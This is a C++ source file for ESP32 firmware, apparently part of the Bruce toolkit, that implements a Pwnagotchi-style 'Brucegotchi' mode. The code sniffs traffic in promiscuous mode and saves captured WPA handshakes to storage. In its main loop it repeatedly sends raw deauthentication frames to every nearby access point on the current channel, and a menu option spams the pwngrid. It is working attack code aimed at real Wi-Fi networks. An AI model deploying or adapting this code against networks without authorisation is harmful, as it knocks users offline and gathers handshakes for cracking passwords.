/*
Thanks to thoses developers for their projects:
* @7h30th3r0n3 : https://github.com/7h30th3r0n3/Evil-M5Core2 and https://github.com/7h30th3r0n3/PwnGridSpam
* @viniciusbo : https://github.com/viniciusbo/m5-palnagotchi
* @sduenasg : https://github.com/sduenasg/pio_palnagotchi

Thanks to @bmorcelli for his help doing a better code.
*/
#include "../wifi/sniffer.h"
#include "../wifi/wifi_atks.h"
#include "core/mykeyboard.h"
#include "core/wifi/wifi_common.h"
#include "esp_err.h"
#include "spam.h"
#include "ui.h"
#include <Arduino.h>

#define STATE_INIT 0
#define STATE_WAKE 1
#define STATE_HALT 255

void advertise(uint8_t channel);
void wakeUp();
void toggle_all_channels();

uint8_t state;
uint8_t current_channel = 255; // Will wrap to 0 on first increment, starting at first channel
uint32_t last_mood_switch = 10001;
bool pwnagotchi_exit = false;
bool use_all_channels = false; // Toggle flag for all channels

// Primary channels (default: 1, 6, 11)
const uint8_t pri_wifi_channels_default[] = {1, 6, 11};

// all_wifi_channels[] is already defined in sniffer.h - we'll use that

// Pointer to current channel array
const uint8_t *active_channels = pri_wifi_channels_default;
uint8_t active_channels_size = sizeof(pri_wifi_channels_default) / sizeof(pri_wifi_channels_default[0]);

void toggle_all_channels() {
    use_all_channels = !use_all_channels;

    if (use_all_channels) {
        active_channels = all_wifi_channels;
        active_channels_size = sizeof(all_wifi_channels) / sizeof(all_wifi_channels[0]);
        current_channel = 255; // Will wrap to 0 on next increment
    } else {
        active_channels = pri_wifi_channels_default;
        active_channels_size = sizeof(pri_wifi_channels_default) / sizeof(pri_wifi_channels_default[0]);
        current_channel = 255; // Will wrap to 0 on next increment
    }
}

void brucegotchi_setup() {
    initPwngrid();
    initUi();
    state = STATE_INIT;
    Serial.println("Brucegotchi Initialized");
}

void brucegotchi_update() {
    if (state == STATE_HALT) { return; }

    if (state == STATE_INIT) {
        state = STATE_WAKE;
        wakeUp();
    }

    if (state == STATE_WAKE) {
        checkPwngridGoneFriends();
        current_channel++; // Sniffer ch variable
        // Cycle through active channels
        if (current_channel >= active_channels_size) { current_channel = 0; }
        ch = active_channels[current_channel];
        advertise(active_channels[current_channel]);
    }
    updateUi(true);
}

void wakeUp() {
    for (uint8_t i = 0; i < 4; i++) {
        setMood(i % getNumberOfMoods());
        updateUi(false);
        vTaskDelay(300 / portTICK_RATE_MS);
    }
}

void advertise(uint8_t channel) {
    uint32_t elapsed = millis() - last_mood_switch;
    if (elapsed > 2500) {
        setMood(random(2, getNumberOfMoods() - 1)); // random mood
        last_mood_switch = millis();
    }

    esp_err_t result = pwngridAdvertise(channel, getCurrentMoodFace());

    if (result == ESP_ERR_WIFI_IF) {
        setMood(MOOD_BROKEN, "", "Error: invalid interface", true);
        state = STATE_HALT;
    } else if (result == ESP_ERR_INVALID_ARG) {
        setMood(MOOD_BROKEN, "", "Error: invalid argument", true);
        state = STATE_HALT;
    } else if (result == ESP_ERR_NO_MEM) {
        setMood(MOOD_BROKEN, "", "Error: not enough memory", true);
        state = STATE_HALT;
    } else if (result != ESP_OK) {
        setMood(MOOD_BROKEN, "", "Error: unknown", true);
        state = STATE_HALT;
    }
}

void set_pwnagotchi_exit(bool new_value) { pwnagotchi_exit = new_value; }

void brucegotchi_start() {
    set_pwnagotchi_exit(false);

    tft.fillScreen(bruceConfig.bgColor);
    num_HS = 0; // restart pwnagotchi counting
    sniffer_reset_handshake_cache();
    registeredBeacons.clear();          // Clear the registeredBeacon array in case it has something
    vTaskDelay(300 / portTICK_RATE_MS); // Due to select button pressed to enter / quit this feature*

    // Prepare storage before enabling promiscuous mode
    FS *handshakeFs = nullptr;
    if (setupSdCard()) {
        isLittleFS = false;
        if (!SD.exists("/BrucePCAP")) SD.mkdir("/BrucePCAP");
        if (!SD.exists("/BrucePCAP/handshakes")) SD.mkdir("/BrucePCAP/handshakes");
        handshakeFs = &SD;
    } else {
        if (!LittleFS.exists("/BrucePCAP")) LittleFS.mkdir("/BrucePCAP");
        if (!LittleFS.exists("/BrucePCAP/handshakes")) LittleFS.mkdir("/BrucePCAP/handshakes");
        isLittleFS = true;
        handshakeFs = &LittleFS;
    }
    if (handshakeFs) {
        sniffer_prepare_storage(handshakeFs, !isLittleFS);
        sniffer_set_mode(SnifferMode::HandshakesOnly);
        sniffer_reset_handshake_cache();
    }

    brucegotchi_setup(); // Starts the thing
    // Draw footer & header
    drawTopCanvas();
    drawBottomCanvas();
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default)); // prepares the Deauth frame
    sniffer_set_mode(SnifferMode::HandshakesOnly); // Pwnagotchi only looks for handshakes

#if defined(HAS_TOUCH)
    TouchFooter();
#endif
    brucegotchi_update();

    uint32_t lastAdv = 0;
    uint32_t lastUi = 0;
    uint32_t lastDeauth = 0;
    uint32_t lastMoodCheck = 0;
    bool deauthFaces = false;

    while (true) {
        uint32_t now = millis();

        if (registeredBeacons.size() > 30) {
            registeredBeacons.clear();
        }

        if (now - lastAdv > 2500) {
            current_channel++;
            if (current_channel >= active_channels_size) current_channel = 0;
            ch = active_channels[current_channel];
            advertise(ch);
            lastAdv = now;
        }

        if (now - lastDeauth > 800 && !registeredBeacons.empty()) {
            for (const auto &beacon : registeredBeacons) {
                if (beacon.channel == ch) {
                    memcpy(&ap_record.bssid, beacon.MAC, 6);
                    wsl_bypasser_send_raw_frame(&ap_record, beacon.channel);
                    send_raw_frame(deauth_frame, 26);
                }
            }
            lastDeauth = now;
            deauthFaces = true;
        }

        if (now - lastMoodCheck > 4000) {
            if (!registeredBeacons.empty()) {
                // Active pwnage: cycle through intense/cool/motivated/debugging moods
                static const uint8_t activeMoods[] = {7, 8, 12, 14, 20};
                static uint8_t activeIdx = 0;
                setMood(activeMoods[activeIdx % 5], "", "Pwning " + String(registeredBeacons.size()) + " friends!", false);
                activeIdx++;
            } else if (deauthFaces) {
                // Just finished deauthing but no active friends: happy/excited
                static const uint8_t happyMoods[] = {9, 10, 11, 13};
                static uint8_t happyIdx = 0;
                setMood(happyMoods[happyIdx % 4], "", "", false);
                happyIdx++;
                deauthFaces = false;
            } else {
                // No friends around: mood varies by loneliness
                static const uint8_t lonelyMoods[] = {5, 15, 16, 17, 18};
                static uint8_t lonelyIdx = 0;
                setMood(lonelyMoods[lonelyIdx % 5], "", "", false);
                lonelyIdx++;
            }
            lastMoodCheck = now;
        }

        if (now - lastUi > 1000) {
            updateUi(true);
            lastUi = now;
        }

        if (check(SelPress)) {
            String channel_status = use_all_channels ? "All Ch: ON" : "All Ch: OFF";

            options = {
                {"Find friends", yield},
                {"Pwngrid spam", send_pwnagotchi_beacon_main},
                {channel_status.c_str(), toggle_all_channels},
                {"Main Menu", lambdaHelper(set_pwnagotchi_exit, true)},
            };
            loopOptions(options);
            tft.fillScreen(bruceConfig.bgColor);
            drawTopCanvas();
            drawBottomCanvas();
            updateUi(true);
        }
        if (pwnagotchi_exit) { break; }
        vTaskDelay(10 / portTICK_RATE_MS);
    }

    // Turn off WiFi
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    wifiDisconnect();
}
